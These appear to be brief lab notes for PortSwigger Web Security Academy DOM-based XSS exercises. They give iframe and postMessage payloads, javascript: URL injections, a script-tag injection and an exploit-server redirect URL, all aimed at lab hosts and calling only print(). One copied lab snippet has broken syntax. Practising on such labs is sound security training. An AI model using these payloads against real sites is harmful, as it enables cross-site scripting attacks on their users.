____

addEventListener

```js
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

```js
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

```js
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

location.href

```html
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```

```url
https://0a5e00280463808e835e193500ba0092.web-security-academy.net/post?postId=4&url=https://exploit-0abb00a704e48054836518f201070024.exploit-server.net/exploit
```

window.location

```html
<iframe src="https://0a7e00f3037ad8b8809821480019007b.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a7e00f3037ad8b8809821480019007b.web-security-academy.net';window.x=1;">
```
